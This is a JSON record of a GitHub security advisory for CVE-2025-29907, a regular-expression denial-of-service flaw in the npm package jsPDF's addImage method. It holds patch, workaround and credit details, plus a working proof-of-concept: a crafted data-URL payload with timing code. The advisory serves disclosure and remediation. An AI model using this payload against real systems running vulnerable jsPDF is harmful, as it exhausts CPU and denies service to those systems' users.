{
  "Severity": "HIGH",
  "UpdatedAt": "2025-03-18T21:07:49Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "jspdf"
  },
  "Advisory": {
    "DatabaseId": 285165,
    "Id": "GSA_kwCzR0hTQS13NTMyLWp4amgtaGpoas4ABFnt",
    "GhsaId": "GHSA-w532-jxjh-hjhj",
    "References": [
      {
        "Url": "https://github.com/parallax/jsPDF/security/advisories/GHSA-w532-jxjh-hjhj"
      },
      {
        "Url": "https://github.com/parallax/jsPDF/commit/b167c43c27c466eb914b927885b06073708338df"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-29907"
      },
      {
        "Url": "https://github.com/advisories/GHSA-w532-jxjh-hjhj"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-w532-jxjh-hjhj"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-29907"
      }
    ],
    "Description": "### Impact\nUser control of the first argument of the `addImage` method results in CPU utilization and denial of service.\n\nIf given the possibility to pass unsanitized image urls to the `addImage` method, a user can provide a harmful data-url that results in high CPU utilization and denial of service.\n\nOther affected methods are: `html`, `addSvgAsImage`.\n\nExample payload:\n```js\nimport { jsPDF } from \"jpsdf\" \n\nconst doc = new jsPDF();\nconst payload = 'data:/charset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=s\\x00base64,undefined';\n\nconst startTime = performance.now()\n\ntry {\n doc.addImage(payload, \"PNG\", 10, 40, 180, 180, undefined, \"SLOW\");\n} catch (err) {\n  const endTime = performance.now()\n  console.log(`Call to doc.addImage took ${endTime - startTime} milliseconds`)\n}\n\ndoc.save(\"a4.pdf\");\n```\n\n### Patches\nThe vulnerability was fixed in jsPDF 3.0.1. Upgrade to jspdf@\u003e=3.0.1\n\n### Workarounds\nSanitize image urls before passing it to the `addImage` method or one of the other affected methods.\n\n### Credits\nResearcher: Aleksey Solovev (Positive Technologies)",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-03-18T21:07:47Z",
    "Severity": "HIGH",
    "Summary": "jsPDF Bypass Regular Expression Denial of Service (ReDoS)",
    "UpdatedAt": "2025-03-19T05:58:36Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "3.0.1"
      },
      "VulnerableVersionRange": "\u003c 3.0.1"
    }
  ]
}